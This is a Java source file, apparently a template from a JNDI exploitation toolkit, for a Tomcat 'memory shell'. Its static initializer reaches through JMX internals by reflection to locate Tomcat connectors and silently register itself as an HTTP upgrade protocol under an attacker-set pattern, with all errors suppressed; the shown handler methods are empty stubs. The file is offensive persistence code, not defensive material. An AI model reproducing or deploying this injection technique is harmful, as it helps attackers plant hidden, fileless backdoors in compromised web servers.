package com.qi4l.jndi.template.memshell.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.connector.Connector;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.Request;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.modeler.Registry;
import org.apache.tomcat.util.net.SocketWrapperBase;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * Tomcat Upgrade 内存马
 */
public class TUGMSFromJMXuP implements UpgradeProtocol {
    public static String pattern;

    static {
        try {
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Field field1 = repository.getClass().getDeclaredField("domainTb");
            field1.setAccessible(true);

            HashMap map         = (HashMap) field1.get(repository);
            HashMap catalinaMap = (HashMap) map.get("Catalina");

            for (int i = 0; i < catalinaMap.keySet().size(); i++) {
                Object key = catalinaMap.keySet().toArray()[i];
                if (key.toString().contains("type=Connector")) {
                    NamedObject  namedObject  = (NamedObject) catalinaMap.get(key);
                    DynamicMBean dynamicMBean = namedObject.getObject();

                    Field field2 = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field2.setAccessible(true);
                    Connector connector = (Connector) field2.get(dynamicMBean);

                    Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
                    protocolHandlerField.setAccessible(true);
                    AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(connector);

                    Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
                    upgradeProtocolsField.setAccessible(true);
                    HashMap<String, UpgradeProtocol> upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);

                    upgradeProtocols.put(pattern.substring(1), new TUGMSFromJMXuP());
                    upgradeProtocolsField.set(handler, upgradeProtocols);
                    break;
                }
            }
        } catch (Exception ignored) {
        }

    }

    @Override
    public String getHttpUpgradeName(boolean b) {
        return null;
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, Request request) {
        return null;
    }

    @Override
    public boolean accept(Request request) {
        return false;
    }
}
